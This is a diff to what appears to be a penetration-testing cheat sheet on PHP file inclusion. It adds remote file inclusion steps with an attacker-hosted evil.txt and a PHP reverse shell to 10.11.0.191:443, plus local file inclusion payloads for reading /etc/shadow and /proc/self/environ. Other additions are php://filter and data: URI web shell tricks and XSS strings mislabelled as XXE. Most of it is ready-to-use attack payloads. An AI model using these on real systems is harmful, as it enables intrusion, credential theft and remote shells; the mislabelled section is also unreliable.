@@ -18,15 +18,76 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 mv evil.jpg evil.php.jpg
 ```
 
+------------------------------------------------------------------------------------------------------------
+
+## Remote File Inclusion (RFI)
+
+Remote file inclusion uses pretty much the same vector as local file inclusion.
+
+A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.
+
+RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.
+
+This is how they work.
+
+So you have an unsanitized parameter, like this
+```
+$incfile = $_REQUEST["file"];
+include($incfile.".php");
+```
+Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.
+```
+http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
+```
+And evil.txt will look like something like this:
+```
+<?php echo shell_exec("whoami");?>
+```
+### Or just get a reverse shell directly like this:
+```
+<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
+```
+So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
+Avoid extentions
+
+Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.
+
+If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.
+
+
+
 -------------------------------------------------------------------------------------------------------------
-## LFI payloads
+## Local file inclusion (LFI) payloads
+
+`../../../../../../etc/passwd`
+
+`....//....//....//....//....//etc/passwd`
+
+`php:expect://id`
+
+`php:expect://whoami`
+
+You can also try to use those insted of `/etc/passwd`
+```
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/var/log/apache2/access.log
+```
+
+## LFI examples
 
 *akech.com/index.php?token=`/etc/passwd%00`*
 
 *akrech.com/index.php?page=`../../../../../../etc/passwd`*
-
-
-## LFI examples
 
 ```
 http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
@@ -45,7 +106,8 @@ php://filter/convert.base64-encode/resource=
 ```
 *example input:*
 
-akrech/index.php?token=`php://filter/convert.base64-encode/resource=`admin/config
+http://example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php
+http://example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php
 
 *example output:*
 
@@ -70,6 +132,20 @@ if(!$con)...
 
 -------------------------------------------------------------------------------------------------------------
 
+
+## XXE basic payloads
+
+```
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<embed src="javascript:alert(1)">
+<img src="javascript:alert(1)">
+<image src="javascript:alert(1)">
+<script src="javascript:alert(1)">
+```
+
+
+-------------------------------------------------------------------------------------------------------
 ## lxc/lxd Privilege Escalation
 
 ```
